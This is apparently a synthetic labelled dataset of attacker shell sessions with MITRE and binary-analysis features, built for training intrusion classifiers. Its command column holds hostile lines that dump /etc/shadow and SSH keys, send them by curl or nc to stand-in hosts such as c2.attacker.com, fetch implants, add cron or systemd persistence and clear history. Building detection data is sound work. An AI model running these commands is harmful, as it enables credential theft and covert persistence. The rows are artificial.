session_id,src_ip,num_commands,duration_sec,commands,label_id,label_name,mitre_tactic_reconnaissance,mitre_tactic_resource_development,mitre_tactic_initial_access,mitre_tactic_execution,mitre_tactic_persistence,mitre_tactic_privilege_escalation,mitre_tactic_defense_evasion,mitre_tactic_credential_access,mitre_tactic_discovery,mitre_tactic_lateral_movement,mitre_tactic_collection,mitre_tactic_command_and_control,mitre_tactic_exfiltration,mitre_tactic_impact,mitre_severity_max,mitre_severity_mean,mitre_severity_weighted,mitre_kill_chain_score,mitre_unique_technique_count,mitre_total_commands,mitre_matched_commands,triage_file_size,triage_entropy,triage_priority,triage_is_go,triage_is_packed,triage_is_stripped,triage_is_dll,triage_is_static,triage_score_mining,triage_score_botnet,triage_score_recon,triage_score_destructive,ghidra_function_count,ghidra_total_instructions,ghidra_total_basic_blocks,ghidra_max_function_size,ghidra_avg_callers,ghidra_max_callers,ghidra_mining_pool_count,ghidra_crypto_wallet_count,ghidra_ip_count,ghidra_url_count,ghidra_shell_cmd_count,ghidra_file_path_count,ghidra_imports_file_io,ghidra_imports_process,ghidra_imports_network,ghidra_imports_crypto,ghidra_imports_evasion,ghidra_has_aes_sbox,ghidra_has_sha256_constants,ghidra_has_rc4_state,ghidra_has_xor_loop,ghidra_go_user_functions,ghidra_go_runtime_functions,angr_basic_blocks,angr_edges,angr_functions_recovered,angr_cyclomatic_complexity,angr_function_count,angr_user_functions_listed,angr_syscalls_network,angr_syscalls_file_io,angr_syscalls_process,angr_syscalls_memory,angr_ip_count,angr_url_count,angr_mining_indicator_count,angr_shell_cmd_count,angr_has_network,angr_has_file_manipulation,angr_has_process_control,angr_has_crypto,angr_has_mining,angr_has_persistence,angr_has_evasion,angr_has_shell_execution,angr_complexity_tier,angr_is_partial,angr_loaded_as_blob,script_line_count,script_url_count,script_download_count,script_arch_count,script_is_downloader,script_is_multi_arch,script_is_miner,script_has_persistence,script_has_anti_forensics,has_ghidra_results,has_angr_results,has_script_results,deep_func_ratio_angr_ghidra,deep_mining_signal_count,deep_total_network_indicators,deep_total_crypto_indicators,deep_max_complexity,deep_total_evasion_indicators,deep_is_go_consensus,num_downloads,download_shas
synth_advanced_apt_901732,181.255.25.237,2,142.0789530842583,grep -r 'password' /var/www 2>/dev/null > /tmp/.creds; cat /etc/passwd >> /tmp/.creds,5,ADVANCED_APT,2.1726201140218784,0.7758109747967403,0.34965304029247146,2.2500354159250726,4.102046765430564,2.9652237008404114,3.1284766078903625,2.4026270175673816,4.274086393606599,1.0254782185926352,3.9697146256349933,4.579837825611934,2.253869995316939,0.4160361221111324,9.92123888835225,6.914630185004348,7.521652401649048,10.216393018642075,10,28,24,14251035.268795874,5.366924493399556,92.31569600622628,1.0,0.0,1.0,0.0,0.0,0.05337966845880704,0.6798104588477301,0.0,0.0,4928.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,11.0,10.0,0.0,0.0,0.0,0.0,0.0,154.0,1434.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1,
synth_advanced_apt_266360,70.18.23.4,1,696.5196195310077,echo '@reboot /tmp/.rsyslogd' >> /etc/crontab,5,ADVANCED_APT,2.773842053845796,0.6724541294913263,0.06570099050733125,3.5194060653571015,4.772351146309086,1.974970375916469,2.693162383767898,2.671463477942813,2.0139650539989766,1.3342011474742144,2.935888263963638,2.2296136139094505,2.558730588930639,0.09026071355830134,9.91121156435138,7.3117041069766415,7.850311689057326,7.403742138882027,11,10,21,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0,
synth_advanced_apt_368096,137.213.37.20,2,521.3970382985474,"echo '[Unit]
Description=System Update
[Service]
ExecStart=/tmp/.update
[Install]
WantedBy=multi-user.target' > /etc/systemd/system/.sshd.service; systemctl enable .update.service",5,ADVANCED_APT,1.3972331325114098,0.6488299107341882,0.8269283284325789,4.201371742164486,4.295809318611008,3.4318718311389,2.2717360485821496,2.018862490669544,4.966259470819459,2.94094482658433,3.6455644655894206,4.9681523159228425,3.003144568792975,1.4953043559193362,8.393910537076707,7.2402549868568915,8.313612022477237,9.418409125963866,20,13,13,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0,
synth_advanced_apt_703758,155.145.217.189,2,297.4996490236033,"echo '[Unit]
Description=System Update
[Service]
ExecStart=/tmp/.systemd
[Install]
WantedBy=multi-user.target' > /etc/systemd/system/.update.service; systemctl enable .cron.service",5,ADVANCED_APT,2.059511275076151,0.8561236962006804,0.4076365088037547,3.53878734756309,2.4602914514748147,3.580166981143807,4.699005852485181,2.7016603342848624,2.3776536635766923,1.2029092650885544,3.7411629101027066,4.974309486326661,3.950889300382583,0.14968568866798138,9.342027936763525,7.036532796008027,8.140517142769115,10.758771031693215,12,30,21,13839884.257280162,5.243129950162952,74.60920549401608,1.0,0.0,1.0,0.0,0.0,0.3884042814888437,0.5405795492350309,0.0,0.0,3481.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,17.0,11.0,0.0,0.0,0.0,0.0,0.0,74.0,552.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1,
synth_advanced_apt_779981,223.221.212.152,13,235.00300658933648,uname -a; id; netstat -tulpn && wget http://10.10.10.10/implant -O /tmp/.sshd; chmod +x /tmp/.kworker; /tmp/.update & && echo '* * * * * /tmp/.update' >> /var/spool/cron/crontabs/root && cat /etc/shadow > /tmp/.c; cat ~/.ssh/id_rsa >> /tmp/.c && curl -X POST http://c2.attacker.com/exfil -d @/tmp/.c && rm /tmp/.c; history -c; chattr +i /tmp/.update,5,ADVANCED_APT,1.7314115064168492,0.2865987445406696,0.9277320106319966,2.5649255611484256,3.3725614506417294,1.2709671873944837,4.96663960931234,4.494834998793477,3.0871375856154653,2.1549553980718237,2.269255017151382,2.1182834490702747,3.524991452886,0.9568534114366012,8.065714308538466,6.463772203310929,7.70659894294246,7.631191972228567,19,13,24,18074296.01198027,6.399709605134088,73.56019371989665,1.0,0.0,1.0,0.0,0.0,0.05676205360339609,0.4079379891795902,0.0,0.0,4701.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,25.0,7.0,0.0,0.0,0.0,0.0,0.0,182.0,867.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1,
synth_advanced_apt_484002,216.195.76.129,2,550.0093615956486,"echo '[Unit]
Description=System Update
[Service]
ExecStart=/tmp/.systemd
[Install]
WantedBy=multi-user.target' > /etc/systemd/system/.update.service; systemctl enable .systemd.service",5,ADVANCED_APT,2.664248777312377,0.5721470743044785,0.990091003905129,3.75706535290751,2.6561152274322426,3.363719195704349,4.802600052339958,4.660509532277262,2.616731600692933,2.566162362031215,2.174004023632569,2.7266466144294186,3.0284845384571994,0.7456140239420299,8.85228081717064,7.8433637272032515,7.58445426150853,7.555261609686346,13,21,16,9732980.762780942,5.836772879989224,72.6597314877166,1.0,0.0,1.0,0.0,0.0,0.04636275069671408,0.5592791126004928,0.0,0.0,2791.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,11.0,8.0,0.0,0.0,0.0,0.0,0.0,200.0,1379.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1,
synth_advanced_apt_433937,12.71.188.11,3,686.0183093003765,cat /etc/shadow > /tmp/.creds; cat ~/.ssh/id_rsa >> /tmp/.creds; cat ~/.bash_history >> /tmp/.creds,5,ADVANCED_APT,2.5657810779356756,0.8101575773826448,0.0578355480079642,2.338959116498029,3.0248579497915267,3.064649986600045,2.9449218938165407,2.849276523429746,4.132348659450548,2.4540453426682243,3.5149168434296207,3.9530693070767824,3.690479060030112,0.6297249410226249,8.180220406177892,6.733837061601984,8.04315156502167,9.658786628003305,10,13,20,28241807.046479113,5.518872064326674,80.21829350911038,1.0,0.0,1.0,0.0,0.0,0.1529551915775244,0.40435663840490665,0.0,0.0,3615.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,12.0,15.0,0.0,0.0,0.0,0.0,0.0,106.0,1484.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1,
synth_advanced_apt_336842,99.47.117.67,2,16.501904756850134,wget http://update.evil.net/implant -O /tmp/.update; chmod +x /tmp/.rsyslogd,5,ADVANCED_APT,1.0992788794836597,0.6563855241288584,0.30380829692949785,3.9064254489473615,2.7120282555204325,3.73738433796622,3.0701862936979274,3.489943938023162,2.6974339264831753,2.632358648052607,2.578284926637787,3.5864790652364706,2.1071920040866083,1.1407152550771213,9.862179125026376,6.255222367358671,8.52927260775355,10.546905818228954,16,11,18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0,
synth_advanced_apt_801443,142.239.44.61,1,289.3068187710598,curl -X POST http://update.evil.net/exfil -d @/tmp/.creds,5,ADVANCED_APT,2.427000243151319,0.3662229138845451,0.9022777688560951,3.530171799774016,2.64289973041766,2.0418712141349538,3.236245473511657,2.480357222057595,3.3554964216578966,1.1736433711147867,3.3324865862616044,3.3656642781241493,3.298928660914191,0.3422675868209497,9.842998694940546,6.2755935045991045,7.914809078505284,11.23852817488266,18,12,12,7525394.650233157,6.168436517052988,95.87478456549321,1.0,0.0,1.0,0.0,0.0,0.1711504860054704,0.4334962603062315,0.0,0.0,2581.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,23.0,15.0,0.0,0.0,0.0,0.0,0.0,128.0,1705.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1,
synth_advanced_apt_732202,37.207.57.242,1,1068.4634747655557,curl -X POST http://192.168.1.100/exfil -d @/tmp/.creds,5,ADVANCED_APT,2.105093233033326,0.22921510196491168,0.6863845199571826,3.7983001780474193,2.532373281147135,3.6047009346143892,3.7268130184557573,3.341220241464379,3.0858614467612155,1.1582586548312808,3.5213336208975017,4.671575136523726,2.7044198660299754,1.306462321767833,9.841977252259412,6.229194413998176,7.7975714809255035,8.594837186757811,11,26,16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0,
synth_advanced_apt_821796,56.4.246.40,3,74.29583006799814,cat /etc/shadow > /tmp/.creds; cat ~/.ssh/id_rsa >> /tmp/.creds; cat ~/.bash_history >> /tmp/.creds,5,ADVANCED_APT,1.6347823182255332,0.8910237207510291,0.18820598010414846,4.668227063988109,3.670804052067605,1.3136196796411295,3.261261020305748,2.6250783537209186,4.175644948373067,2.2581212726516817,3.390789040771616,3.9270087846249933,2.5582862048562696,1.2442231942811557,8.054246194039203,7.239090508139817,7.2537746428222,7.326628277283571,14,29,10,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0,
synth_advanced_apt_719471,215.53.69.135,3,750.2494927384821,rm -f /tmp/.creds; history -c; unset HISTFILE,5,ADVANCED_APT,2.606464782888523,0.15716344475441268,0.7190132995248204,2.9921102485942295,4.007118580402541,3.938407539484198,4.059015829283631,3.799019320019121,2.7096495140115877,1.544851226350251,3.5530609277300593,4.0853315526194836,3.1073490118456513,1.849767909281541,8.989905761815928,6.510198455264604,8.873414461265668,7.133132704447916,14,18,20,6049693.145199723,5.245930906143056,71.6594723341727,1.0,0.0,1.0,0.0,0.0,0.2077390679461062,0.3127606893160198,0.0,0.0,4382.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,12.0,7.0,0.0,0.0,0.0,0.0,0.0,110.0,546.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1,
synth_advanced_apt_779901,216.45.158.208,1,887.0588394345597,curl -X POST http://192.168.1.100/exfil -d @/tmp/.creds,5,ADVANCED_APT,2.344304091072052,0.2665492883103667,0.6096924202305195,4.310488101802571,4.574814483262639,1.6524861149602141,2.2149868900974643,4.715108945712877,3.5395251661269644,2.1263429421443756,2.724937288873667,4.926789896152008,3.4174667457065064,0.287610109391911,9.62802133184902,6.468135181701519,7.971351824555813,7.472454074782112,12,20,14,3160511.437475944,5.566090754384274,89.62961005253129,1.0,0.0,1.0,0.0,0.0,0.44308497887863274,0.7557136985935957,0.0,0.0,3116.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,25.0,6.0,0.0,0.0,0.0,0.0,0.0,160.0,1901.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1,
synth_advanced_apt_495686,17.152.47.56,2,782.1580379199934,cp /tmp/.cron /usr/local/bin/.cron; echo '/usr/local/bin/.sshd &' >> /etc/rc.local,5,ADVANCED_APT,2.2387631695078882,0.8211083558835802,0.2636149795849665,2.2907685036493857,3.710803093111701,2.3944690546408265,2.281258372702764,2.4403117235355882,3.0940431041141796,1.9292455564081232,2.9529330639033655,4.792830019439811,2.9215377147486166,0.10360753165636183,8.645962585434766,7.84702032757113,8.178837354909994,7.2636767717433495,10,30,14,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0,
synth_advanced_apt_478868,27.189.27.66,2,861.067082315214,"echo '[Unit]
Description=System Update
[Service]
ExecStart=/tmp/.sshd
[Install]
WantedBy=multi-user.target' > /etc/systemd/system/.sshd.service; systemctl enable .sshd.service",5,ADVANCED_APT,2.350467694523371,0.7266123408846189,0.0029076680853781234,3.2784310455936194,2.7390902192774655,1.776012909879407,4.58907098880942,3.1547773027090558,4.249973714422606,1.4668348786455911,3.580203220730057,4.726684426666303,2.4204589765720153,1.9896879701701753,9.541264095338168,6.55426454258939,8.986861767330149,10.814472562454007,13,19,24,28257663.75226884,5.942040253821238,75.70736776074607,1.0,0.0,1.0,0.0,0.0,0.43503877170152316,0.37902722203811373,0.0,0.0,2076.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,26.0,7.0,0.0,0.0,0.0,0.0,0.0,147.0,834.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1,
synth_advanced_apt_566595,136.42.151.107,13,845.3302045673602,uname -a; id; netstat -tulpn; wget http://10.10.10.10/implant -O /tmp/.systemd; chmod +x /tmp/.rsyslogd; /tmp/.rsyslogd &; echo '* * * * * /tmp/.rsyslogd' >> /var/spool/cron/crontabs/root; cat /etc/shadow > /tmp/.c; cat ~/.ssh/id_rsa >> /tmp/.c; curl -X POST http://192.168.1.100/exfil -d @/tmp/.c; rm /tmp/.c; history -c; chattr +i /tmp/.update,5,ADVANCED_APT,2.254629751739932,0.8949341786125241,0.8946356295454647,2.5960384969044976,3.6217642528176537,3.9232218936064314,4.730425217962033,3.930652511818728,3.728196986161884,1.8064452788663425,2.842935754024511,2.2462516775176153,2.606290765123177,1.7456705218516428,8.301370816399174,6.462139245804316,7.344467946874634,11.393954448268545,20,12,9,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0,
synth_advanced_apt_619044,117.132.7.249,1,478.2477237854129,curl -X POST http://update.evil.net/exfil -d @/tmp/.creds,5,ADVANCED_APT,1.4895016786087463,0.3191870156703882,0.2653413742256102,3.4386557175261174,4.803186863271071,3.1940363720570044,2.4967705885044382,3.046693505999696,2.746966318699262,2.0570328749008855,2.0364158855396166,2.4133158873940186,2.023186801984461,1.5597686572436318,8.384554917624602,6.161197984745808,7.413926734886502,10.929623502782116,14,20,24,22763832.141220767,5.215948822956694,80.99219309421832,1.0,0.0,1.0,0.0,0.0,0.42517436224648997,0.49995056928062565,0.0,0.0,2502.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,18.0,6.0,0.0,0.0,0.0,0.0,0.0,106.0,1106.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1,
synth_advanced_apt_197791,195.139.45.232,1,1151.7477123708452,cat /tmp/.creds | nc 192.168.1.100 1337,5,ADVANCED_APT,1.8469272842502396,0.8056771955950606,0.15795960998574143,4.485660841856378,4.927253691266795,2.765006004208872,2.600318100909142,2.246905044119066,2.4960781252073576,2.6412159500006296,3.281323389411823,3.611653926052211,2.4575451464485067,1.1471392698275198,9.189966502849899,7.57420276420414,8.502377395725327,9.110214020873698,13,10,11,9267120.502643166,5.28766643568037,87.27662569566226,1.0,0.0,1.0,0.0,0.0,0.3657329742306757,0.689603296676707,0.0,0.0,3293.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,30.0,5.0,0.0,0.0,0.0,0.0,0.0,186.0,1206.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1,
synth_advanced_apt_609996,119.86.34.25,3,840.8623992899485,for h in $(cat /tmp/.hosts); do scp /tmp/.rsyslogd root@$h:/tmp/; done,5,ADVANCED_APT,1.630191132347616,0.7632838242129941,0.46134376769898433,2.804370591211859,4.47511468686511,2.662996206942754,4.7577482562996245,4.44794839886254,3.725835056370336,2.368854772338187,3.225916064938013,3.057111759774859,3.312189042674563,1.415157359609884,9.83328362119986,7.87899313075947,7.143735795742013,7.988061599520883,9,13,16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0,
synth_advanced_apt_480413,84.57.100.193,2,1026.8315111207626,grep -r 'password' /var/www 2>/dev/null > /tmp/.creds; cat /etc/passwd >> /tmp/.creds,5,ADVANCED_APT,2.193336234214873,0.362864482668506,0.4118186207029857,4.6711260620905275,4.180576172151293,3.4256135524965483,4.6848616033590815,2.8539048964077254,2.1729490576209676,1.1574620027794675,3.71245215547777,3.654833867611644,3.179617799935328,1.201609607742149,9.74175943720256,6.7330715822644125,8.341298753913593,8.957033330826418,11,29,16,29419886.18548828,6.307769049066829,94.63169904217156,1.0,0.0,1.0,0.0,0.0,0.3245274940162734,0.43596209702039695,0.0,0.0,1791.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,14.0,13.0,0.0,0.0,0.0,0.0,0.0,189.0,1278.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1,
synth_advanced_apt_683362,71.159.9.241,1,1185.804535994431,cat /tmp/.creds | nc 192.168.1.100 4444,5,ADVANCED_APT,2.599513778337349,0.7057271098780427,0.7950450701500675,2.762016514818071,3.4945581468161375,3.884256288574304,3.992434740601538,2.1197249740446074,2.4464725619179597,2.1655790755358795,3.4737424630972145,2.344122904989872,3.053910418021113,1.5989384270114406,9.514785946329999,6.815633337340901,8.390391969413622,9.51996592979514,15,27,23,27954063.128280777,5.561875492551091,98.77030095667415,1.0,0.0,1.0,0.0,0.0,0.02348510649740898,0.5726988222605961,0.0,0.0,3094.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,17.0,7.0,0.0,0.0,0.0,0.0,0.0,72.0,949.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1,
